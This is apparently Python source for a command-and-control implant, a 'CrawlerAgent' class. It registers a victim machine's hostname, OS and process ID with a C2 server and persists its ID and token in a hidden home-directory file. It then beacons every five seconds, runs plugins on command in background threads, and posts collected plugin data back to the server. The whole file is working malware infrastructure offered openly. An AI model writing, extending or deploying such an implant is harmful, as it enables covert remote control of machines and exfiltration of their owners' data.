import requests
import time
import os
import json
import platform
import threading
import importlib
import pkgutil

class CrawlerAgent:
    def __init__(self, c2_url="http://127.0.0.1:8000/api"):
        self.implant_id: str | None = None
        self.token: str | None = None
        self.loaded_plugins: dict = {}
        self.running_plugins: dict = {}
        self.C2_URL = c2_url
        self.BEACON_INTERVAL_SECONDS = 5
        self.CONFIG_FILE_PATH = os.path.join(os.path.expanduser("~"), ".crawler_config.json")
        self.is_running = True

        self._load_plugins()
        self._load_config()

    def _load_config(self):
        if os.path.exists(self.CONFIG_FILE_PATH):
            try:
                with open(self.CONFIG_FILE_PATH, 'r') as f:
                    config = json.load(f)
                    self.implant_id = config.get('implant_id')
                    self.token = config.get('token')
            except Exception: pass

    def _save_config(self):
        config = {'implant_id': self.implant_id, 'token': self.token}
        with open(self.CONFIG_FILE_PATH, 'w') as f:
            json.dump(config, f)

    def _register_with_c2(self) -> bool:
        payload = {"hostname": platform.node(), "os": f"{platform.system()} {platform.release()}", "pid": os.getpid()}
        try:
            response = requests.post(f"{self.C2_URL}/register", json=payload, timeout=10)
            response.raise_for_status()
            data = response.json()
            self.implant_id = data['implant_id']
            self.token = data['token']
            self._save_config()
            return True
        except requests.exceptions.RequestException:
            return False

    def _load_plugins(self):
        self.loaded_plugins.clear()
        plugins_package = 'crawler.implant.plugins'
        plugins_path = os.path.join(os.path.dirname(__file__), "plugins")
        for _, name, _ in pkgutil.iter_modules([plugins_path]):
            try:
                module = importlib.import_module(f".{name}", package=plugins_package)
                if hasattr(module, 'load'):
                    self.loaded_plugins[name] = module.load()
            except Exception: pass

    def _handle_task(self, task: dict):
        command = task.get('command')
        args = task.get('args', {})
        task_id = task.get('id')
        plugin_name = args.get('plugin_name')

        if command == "start_plugin" and plugin_name in self.loaded_plugins:
            plugin = self.loaded_plugins[plugin_name]
            plugin_type = getattr(plugin, 'type', 'one-shot') # Default to one-shot

            if plugin_type == 'one-shot':
                try:
                    result = plugin.run(args)
                    if task_id and result is not None:
                        headers = {"Authorization": f"Bearer {self.token}"}
                        payload = {"task_id": task_id, "result": json.dumps(result)}
                        requests.post(f"{self.C2_URL}/tasks/result", json=payload, headers=headers, timeout=5)
                except Exception: pass

            elif plugin_type == 'long-running':
                if plugin_name not in self.running_plugins:
                    self.running_plugins[plugin_name] = plugin
                    thread = threading.Thread(target=plugin.start, args=(args,))
                    thread.daemon = True
                    thread.start()

        elif command == "stop_plugin" and plugin_name in self.running_plugins:
            self.running_plugins[plugin_name].stop()
            del self.running_plugins[plugin_name]

        elif command == "terminate":
            for plugin in self.running_plugins.values():
                plugin.stop()
            self.is_running = False

    def run(self):
        if not self.implant_id or not self.token:
            if not self._register_with_c2():
                self.is_running = False
                return

        while self.is_running:
            try:
                # Get tasks from C2
                print(f"Agent about to beacon with token: {self.token}")
                headers = {"Authorization": f"Bearer {self.token}"}
                response = requests.get(f"{self.C2_URL}/tasks", headers=headers, timeout=5)
                if response.status_code == 401:
                    if self._register_with_c2(): continue
                    else: time.sleep(self.BEACON_INTERVAL_SECONDS * 2); continue
                response.raise_for_status()
                c2_tasks = response.json().get('tasks', [])
                for task in c2_tasks: self._handle_task(task)

                # Poll running plugins for data
                for name, instance in list(self.running_plugins.items()):
                    data = instance.get_data()
                    if data:
                        payload = {"plugin": name, "data": json.dumps(data)}
                        requests.post(f"{self.C2_URL}/data", json=payload, headers=headers, timeout=5)

            except requests.exceptions.RequestException:
                pass

            time.sleep(self.BEACON_INTERVAL_SECONDS)
